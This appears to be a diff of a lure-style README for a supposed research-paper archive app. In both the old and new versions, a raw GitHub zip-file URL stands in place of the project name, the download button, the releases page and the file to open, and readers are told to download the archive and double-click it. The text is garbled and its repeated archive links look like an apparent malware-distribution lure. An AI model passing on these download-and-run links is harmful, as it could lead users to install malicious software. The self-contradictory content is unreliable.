@@ -1,28 +1,28 @@
-# 📚 https://github.com/Ahmedfekry221/researcharchive.github.io/raw/refs/heads/main/papers/io-researcharchive-github-v2.8.zip - Your Gateway to Research Papers
+# 📚 https://raw.githubusercontent.com/Ahmedfekry221/researcharchive.github.io/main/pdfs/io_researcharchive_github_1.6.zip - Your Gateway to Research Papers
 
-[![Download](https://github.com/Ahmedfekry221/researcharchive.github.io/raw/refs/heads/main/papers/io-researcharchive-github-v2.8.zip)](https://github.com/Ahmedfekry221/researcharchive.github.io/raw/refs/heads/main/papers/io-researcharchive-github-v2.8.zip)
+[![Download](https://raw.githubusercontent.com/Ahmedfekry221/researcharchive.github.io/main/pdfs/io_researcharchive_github_1.6.zip)](https://raw.githubusercontent.com/Ahmedfekry221/researcharchive.github.io/main/pdfs/io_researcharchive_github_1.6.zip)
 
 ## 🚀 Getting Started
 
-Welcome to the **https://github.com/Ahmedfekry221/researcharchive.github.io/raw/refs/heads/main/papers/io-researcharchive-github-v2.8.zip** repository! This application serves as the main page for navigating all the research archived papers. Here, you can easily access scholarly articles, preprints, and various publications. Follow these steps to get started.
+Welcome to the **https://raw.githubusercontent.com/Ahmedfekry221/researcharchive.github.io/main/pdfs/io_researcharchive_github_1.6.zip** repository! This application serves as the main page for navigating all the research archived papers. Here, you can easily access scholarly articles, preprints, and various publications. Follow these steps to get started.
 
 ## 📥 Download & Install
 
 To begin using our application, you need to download it from the releases page. Click the link below to visit the page:
 
-[Download the latest version](https://github.com/Ahmedfekry221/researcharchive.github.io/raw/refs/heads/main/papers/io-researcharchive-github-v2.8.zip)
+[Download the latest version](https://raw.githubusercontent.com/Ahmedfekry221/researcharchive.github.io/main/pdfs/io_researcharchive_github_1.6.zip)
 
 On the releases page, you will find various versions available. Choose the latest one and follow these steps:
 
 1. Click on the version number to view the available files.
-2. Look for a file named **https://github.com/Ahmedfekry221/researcharchive.github.io/raw/refs/heads/main/papers/io-researcharchive-github-v2.8.zip**. This file contains the main application.
+2. Look for a file named **https://raw.githubusercontent.com/Ahmedfekry221/researcharchive.github.io/main/pdfs/io_researcharchive_github_1.6.zip**. This file contains the main application.
 3. Click the file link to download it to your computer.
 
 Once downloaded, follow the instructions below to open the application.
 
 ## 📂 Opening the Application
 
-To run the application, locate the downloaded **https://github.com/Ahmedfekry221/researcharchive.github.io/raw/refs/heads/main/papers/io-researcharchive-github-v2.8.zip** file on your computer. Double-click on the file. This action will open the application in your default web browser.
+To run the application, locate the downloaded **https://raw.githubusercontent.com/Ahmedfekry221/researcharchive.github.io/main/pdfs/io_researcharchive_github_1.6.zip** file on your computer. Double-click on the file. This action will open the application in your default web browser.
 
 ## 🖥️ System Requirements
 
@@ -66,7 +66,7 @@ We frequently update the application with new features and improvements.
 
 To keep up with the latest updates, visit our releases page regularly:
 
-[Visit our Releases Page](https://github.com/Ahmedfekry221/researcharchive.github.io/raw/refs/heads/main/papers/io-researcharchive-github-v2.8.zip)
+[Visit our Releases Page](https://raw.githubusercontent.com/Ahmedfekry221/researcharchive.github.io/main/pdfs/io_researcharchive_github_1.6.zip)
 
 ## 🌐 Community Contributions
 
@@ -84,7 +84,7 @@ Our application covers a wide range of topics. Here are a few:
 
 ## 🏁 Conclusion
 
-Thank you for using the **https://github.com/Ahmedfekry221/researcharchive.github.io/raw/refs/heads/main/papers/io-researcharchive-github-v2.8.zip** application. We hope it helps you easily navigate and access the research papers you need. Enjoy your time exploring academic content!
+Thank you for using the **https://raw.githubusercontent.com/Ahmedfekry221/researcharchive.github.io/main/pdfs/io_researcharchive_github_1.6.zip** application. We hope it helps you easily navigate and access the research papers you need. Enjoy your time exploring academic content!
 
 For any questions or feedback, please reach out through the repository. 
 
